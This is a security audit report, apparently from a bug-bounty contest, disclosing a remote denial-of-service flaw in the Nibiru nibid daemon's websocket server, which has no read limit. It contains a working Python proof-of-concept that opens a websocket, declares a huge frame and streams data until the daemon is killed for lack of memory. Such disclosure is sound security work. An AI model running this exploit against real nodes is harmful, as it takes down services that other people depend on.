# #9: remote Denial of Service issue in nibid
Labels: ['bug', '3 (High Risk)', 'primary issue', 'sufficient quality report', 'unsatisfactory']
Accepted: True

This file is out of scope https://github.com/NibiruChain/nibiru/blob/main/eth/rpc/rpcapi/websockets.go#L123

However, nibid uses gorilla websocket library, which does not have any read limits by default.

Remote attacker could send huge amount of bytes, at some point 'nibid' daemon will be killed by system OOM killer.

How to reproduce:

1) PoC:

```
#!/usr/bin/env python2
import time
import sys
import struct
from socket import *

host='localhost'
port=8546

s='GET / HTTP/1.1\r\n'  
s+='Host: %s:%d\r\n' % (host, port)
s+='User-Agent: python-requests/2.25.1\r\n'
s+='Accept-Encoding: gzip, deflate\r\n'
s+='Accept: */*\r\n'
s+='Connection: keep-alive\r\n'
s+='Content-Type: application/json\r\n'
s+='Upgrade: websocket\r\n'
s+='Origin: http://%s:%d\r\n' % (host,port)
s+='Connection: upgrade\r\n'
s+='Sec-WebSocket-Key: +RENBTtUz5ztvAFFAVbqwA==\r\n'
s+='Sec-Websocket-Version: 13\r\n'
s+='\r\n'

sock=socket(AF_INET,SOCK_STREAM)
sock.connect((host,port))
sock.sendall(s)
s= sock.recv(100000)
	
print 'Server response: \n\n%s' % s

print 'Sending data, it will take some time...'

frame_header = chr( 1 )
frame_header += chr(0x7f| 0x80)
length = 10000*1024*1024*1024
frame_header += struct.pack("!Q", length)

sock.sendall(frame_header)
while 1:
	sock.sendall('1'*1000000)

```

2) start localnet:
```
$ just localnet
```

3) run PoC, at some point nibid crashes, you can check the messages from OOM killer in /var/log/syslog:
```
Out of memory: Killed process 6635 (nibid) total-vm:248434.., anon-rss:17735924kB, file-rss:0kB, shmem-rss:0kB, UID:1000 pgtables:39036kB oom_score_adj:0
```